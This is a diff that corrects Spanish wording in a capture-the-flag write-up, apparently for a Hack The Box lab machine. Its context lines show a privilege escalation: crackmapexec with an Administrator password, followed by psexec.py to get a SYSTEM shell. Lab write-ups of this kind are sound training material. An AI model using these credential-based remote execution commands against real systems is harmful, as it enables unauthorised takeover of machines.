@@ -1,4 +1,4 @@
-## Privilege Escalation {-}
+## Escalada de Privilegios {-}
 
 ### Rootear la maquina {-}
 
@@ -52,7 +52,7 @@ crackmapexec smb 10.10.10.125 -u 'Administrator' -p 'MyUnclesAreMarioAndLuigi!!1
 
 Ya vemos un **[+]** y un **(Pwn3d)**. Quiere decir que podemos connectarnos al systema con `psexec`
 
-### Conneccion con psexec.py {-}
+### Conexion con psexec.py {-}
 
 ```bash
 psexec.py WORKGROUP/Administrator@10.10.10.125 cmd.exe
@@ -64,4 +64,4 @@ nt authority\system
 
 Ya estamos como root y podemos ver la flag ;)
 
-> [!] NOTA: S4vitar nos enseña mas technicas para connectarnos en el video. Os invito a verlas a partir del minuto 1:24:20
+> [!] NOTA: S4vitar nos enseña mas tecnicas para conectarnos en el video. Os invito a verlas a partir del minuto 1:24:20
